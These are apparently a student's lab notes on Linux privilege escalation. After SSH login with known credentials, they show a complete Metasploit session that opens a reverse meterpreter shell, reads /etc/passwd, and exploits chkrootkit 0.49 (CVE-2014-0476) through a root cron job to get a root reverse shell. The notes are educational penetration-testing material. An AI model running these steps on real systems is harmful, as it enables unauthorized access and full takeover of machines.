# Rootkit

https://www.veracode.com/security/rootkit

A rootkit is a clandestine computer program designed to provide continued privileged access to a computer while actively hiding its presence. 

Originally, a rootkit was a collection of tools that enabled administrator-level access to a computer or network. Root refers to the Admin account on Unix and Linux systems, and kit refers to the software components that implement the tool. 

Today rootkits are generally associated with malware – such as Trojans, worms, viruses – that hide their existence and actions from users and other system processes.

A rootkit allows someone to maintain command and control over a computer without the computer user/owner knowing about it. Once a rootkit has been installed, the controller of the rootkit has the ability to remotely execute files and change system configurations on the host machine. 

Example - `Stuxnet` - the first known rootkit for industrial control systems

# Checkrootkit

https://www.geeksforgeeks.org/detecting-and-checking-rootkits-with-chkrootkit-and-rkhunter-tool-in-kali-linux/

It is a free and open-source antivirus tool available on GitHub. This tool checks locally in the binary system of your machine and scans your Linux server for a trojan. chkrootkit is a shell script which checks system binaries for rootkit modification.  This tool is used for scanning botnets, rootkits, malware, etc. 

# `Chkrootkit version < 0.5.0 is vulnerable to local privilege escalation`
https://www.exploit-db.com/exploits/33899

**************************************************************************************************************************************************************
# Exploiting SSH to gain initial access 

(consider we already have credentials for this lab)

msf5 >` use auxiliary/scanner/ssh/ssh_login`
msf5 auxiliary(scanner/ssh/ssh_login) > `options`

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > `set RHOSTS 192.68.15.3`
RHOSTS => 192.68.15.3
msf5 auxiliary(scanner/ssh/ssh_login) > `set USERNAME jackie`
USERNAME => jackie
msf5 auxiliary(scanner/ssh/ssh_login) > `set PASSWORD password`
PASSWORD => password
msf5 auxiliary(scanner/ssh/ssh_login) > `run`

[+] 192.68.15.3:22 - Success: 'jackie:password' ''
[*] Command shell session 1 opened (192.68.15.2:44885 -> 192.68.15.3:22) at 2024-01-11 05:45:56 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 auxiliary(scanner/ssh/ssh_login) > `sessions`

Active sessions
===============

  Id  Name  Type           Information                           Connection
  --  ----  ----           -----------                           ----------
  1         shell unknown  SSH jackie:password (192.68.15.3:22)  192.68.15.2:44885 -> 192.68.15.3:22 (192.68.15.3)

msf5 auxiliary(scanner/ssh/ssh_login) > `sessions -u 1`
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.68.15.2:4433 
[*] Sending stage (980808 bytes) to 192.68.15.3
[*] Meterpreter session 2 opened (192.68.15.2:4433 -> 192.68.15.3:34322) at 2024-01-11 05:47:11 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 auxiliary(scanner/ssh/ssh_login) > `sessions`

Active sessions
===============

  Id  Name  Type                   Information                                                                  Connection
  --  ----  ----                   -----------                                                                  ----------
  1         shell unknown          SSH jackie:password (192.68.15.3:22)                                         192.68.15.2:44885 -> 192.68.15.3:22 (192.68.15.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.68.15.3  192.68.15.2:4433 -> 192.68.15.3:34322 (192.68.15.3)

msf5 auxiliary(scanner/ssh/ssh_login) > `sessions 2`
[*] Starting interaction with 2...

meterpreter > `sysinfo`
Computer     : 192.68.15.3
OS           : Ubuntu 18.04 (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > `getuid`
Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > 

# We can see that `uid=1000` user is not the root user, lets enumerate users available

meterpreter > `shell`
Process 5381 created.
Channel 1 created.
`/bin/bash -i`
bash: cannot set terminal process group (3318): Inappropriate ioctl for device
bash: no job control in this shell
jackie@victim-1:~$ `cat /etc/passwd`
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
jackie@victim-1:~$ 

# We can observe that there are only 2 users root and jackie while others aer service accounts

# Ok so in order to list out vulnerable programs or services running on target we can list them using `ps aux`

jackie@victim-1:~$ `ps aux`
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4624   792 ?        Ss   05:37   0:00 /bin/sh -c /usr/local/bin/start.sh
root           7  0.0  0.0  55108 20668 ?        S    05:37   0:00 /usr/bin/python /usr/bin/supervisord -n
root          12  0.0  0.0  28352  2580 ?        Ss   05:37   0:00 /usr/sbin/cron
root          22  0.0  0.0  72292  3224 ?        Ss   05:37   0:00 /usr/sbin/sshd
root          30  0.0  0.0   9916  2772 ?        S    05:38   0:00 /bin/bash /bin/check-down
root        3306  0.0  0.0 101548  6988 ?        Ss   05:45   0:00 sshd: jackie [priv]
jackie      3317  0.0  0.0 103848  5616 ?        S    05:45   0:00 sshd: jackie@notty
jackie      3318  0.0  0.0  18372  3008 ?        Ss   05:45   0:00 -bash
jackie      4147  0.0  0.0   1144  1024 ?        S    05:47   0:00 /tmp/TKQfd
jackie      5381  0.0  0.0   4624   864 ?        S    05:50   0:00 /bin/sh
jackie      5382  0.0  0.0  18504  3496 ?        S    05:50   0:00 /bin/bash -i
root        7027  0.0  0.0   4528   716 ?        S    05:54   0:00 sleep 60
jackie      7028  0.0  0.0  34396  2844 ?        R    05:54   0:00 ps aux
jackie@victim-1:~$ 

# We can observe here that the user root has initiated a binary/script named `/bin/check-down` and he has executed it with `/bin/bash`

`root          30  0.0  0.0   9916  2772 ?        S    05:38   0:00 /bin/bash /bin/check-down`

# Lets check what this file does by looking its content

jackie@victim-1:~$ `cat /bin/check-down`
cat /bin/check-down
#!/bin/bash
while :
do
        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
        sleep 60
done
jackie@victim-1:~$ 

# So it is a bash script in which a binary `/usr/local/bin/chkrootkit/chkrootkit` is executed in every 60 seconds

# `chkrootkit` - its a linux utility that is used to scan rootkit in liunux system but chkrootkit version less than 0.5.0 is vulnerable to Local Privilege Escalation

# checking version of chkrootkit

jackie@victim-1:~$ chkrootkit --help
chkrootkit --help
Usage: /bin/chkrootkit [options] [test ...]
Options:
        -h                show this help and exit
        -V                show version information and exit
        -l                show available tests and exit
        -d                debug
        -q                quiet mode
        -x                expert mode
        -r dir            use dir as the root directory
        -p dir1:dir2:dirN path for the external commands used by chkrootkit
        -n                skip NFS mounted dirs
jackie@victim-1:~$ 

jackie@victim-1:~$ `chkrootkit -V`
chkrootkit -V
chkrootkit version 0.49
jackie@victim-1:~$ 

# We observe the this chkrootkit it vulnerable, let use to esclate privileges

jackie@victim-1:~$ `^Z`
Background channel 1? [y/N]  `y`
meterpreter > 
Background session 2? [y/N]  
msf5 auxiliary(scanner/ssh/ssh_login) > `search chkrootkit`

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation


msf5 auxiliary(scanner/ssh/ssh_login) > `use exploit/unix/local/chkrootkit`
msf5 exploit(unix/local/chkrootkit) > `info`

       Name: Chkrootkit Local Privilege Escalation
     Module: exploit/unix/local/chkrootkit
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 2014-06-04

Provided by:
  Thomas Stangner
  Julien "jvoisin" Voisin

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  Yes

Basic options:
  Name        Current Setting       Required  Description
  ----        ---------------       --------  -----------
  CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
  SESSION                          yes       The session to run this module on.

Payload information:

Description:
  Chkrootkit before 0.50 will run any executable file named 
  /tmp/update as root, allowing a trivial privilege escalation. 
  WfsDelay is set to 24h, since this is how often a chkrootkit scan is 
  scheduled by default.

References:
  https://cvedetails.com/cve/CVE-2014-0476/
  OSVDB (107710)
  https://www.exploit-db.com/exploits/33899
  http://www.securityfocus.com/bid/67813
  https://cwe.mitre.org/data/definitions/20.html
  https://seclists.org/oss-sec/2014/q2/430

# We need to specify path to chkrootkit and session

msf5 exploit(unix/local/chkrootkit) > `set CHKROOTKIT /bin/chkrootkit`
CHKROOTKIT => /bin/chkrootkit
msf5 exploit(unix/local/chkrootkit) > `set SESSION 2`
SESSION => 2
msf5 exploit(unix/local/chkrootkit) > `run`

[*] Started reverse TCP double handler on 10.1.0.14:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
^C[*] Exploit completed, but no session was created.

# Semms like we need to change LHOST as it took diffent interface of our local machine

msf5 exploit(unix/local/chkrootkit) > `options`

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHKROOTKIT  /bin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.14        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > `set LHOST 192.68.15.2`
LHOST => 192.68.15.3
msf5 exploit(unix/local/chkrootkit) > `run`

[*] Started reverse TCP double handler on 192.68.15.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo A2SppZFs33HyViTH;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "A2SppZFs33HyViTH\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 3 opened (192.68.15.2:4444 -> 192.68.15.3:43890) at 2024-01-11 06:45:44 +0000
[+] Deleted /tmp/update

`/bin/bash -i`
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# `whoami`
whoami
root
root@victim-1:~# 

# We can observe that we have the root privileges

# This is how we exploit vulnerable programs on linux to eleveate prvileges

# This is also the case with kernel exploits, however for kernel exploits with metaploit will need to be done manually and will involve the process of downloading exploit code remotely